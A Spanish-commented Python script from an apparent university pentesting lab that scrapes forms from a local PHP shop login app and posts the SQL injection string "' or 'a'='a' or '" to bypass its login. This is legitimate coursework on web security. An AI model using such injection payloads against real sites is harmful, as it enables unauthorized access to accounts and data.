#Práctica 9: Pentesting de servicios HTTP
#Windows 10
#Python 3.8.6
#-------------------------------------------
# Libreria de requests => pip install requests
# Libreria Beautifulsoup => pip install beautifulsoup4
#-------------------------------------------

import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup

#Variables del servidor
ip = '192.168.0.10' #Ip del servidor
url = 'http://'+ip+'/TSW/php_tiendita_login/' #URL de la paguina principal

#Parte 1 - conexión HTTP
print("________________________________________________")
print("PARTE 1 - CONEXIÓN HTTP")
try:
    conexion = True
    request = requests.get(url)
    html = request.text
    print("Conexión al servidor exitosa ...")
    print("Página principal obtenida ...")
except :
    conexion = False
    print("Sin conexión al servidor ...")

#Parte 2 - Búsqueda de Formularios (Web Scraping)
print("________________________________________________")
print("PARTE 2 - BÚSQUEDA DE FORMULARIOS (WEB SCRAPING)")
if conexion:
    links = []
    forms = []
    inputs = []

    print("Enlaces encontrados ...")
    bs = BeautifulSoup(html, 'html.parser')
    for link in bs.find_all("a"):
        links.append(link.get("href"))
        print(link.get("href"))
    print(".............................")
    print("Formularios encontrados ...")
    for link  in links:
        request = requests.get(url+link)
        bs = BeautifulSoup(request.text, 'html.parser')
        formularios = bs.find_all("form")
        for formulario in formularios:
            forms.append(formulario.get('action'))
            inputs.append({e['name']: e.get('value', '') for e in bs.find_all('input', {'name': True})})
            print(formulario.get('action'))
else:
    print("Sin conexión al servidor ...")

#Parte 3 - Pentesting a SQL
print("________________________________________________")
print("PARTE 3 - PENTESTING A SQL")
if conexion:
    print("Formulario para el login ...")
    print("Form => "+ url+str(forms[1]))
    print("Inputs => "+ str(inputs[1]))
    print("............................................")
    usuario = "' or 'a'='a' or '"
    password = ""
    inputs[1]['login'] = usuario
    inputs[1]['password'] = password
    print("Inyeccion SQL")
    print(inputs[1])
    print("............................................")
    requests = requests.post(url+forms[1], data = inputs[1])
    bs = BeautifulSoup(requests.text, 'html.parser')
    print(str(bs.find('body')).split('<br/>')[8])
    print("............................................")
else:
    print("Sin conexión al servidor ...")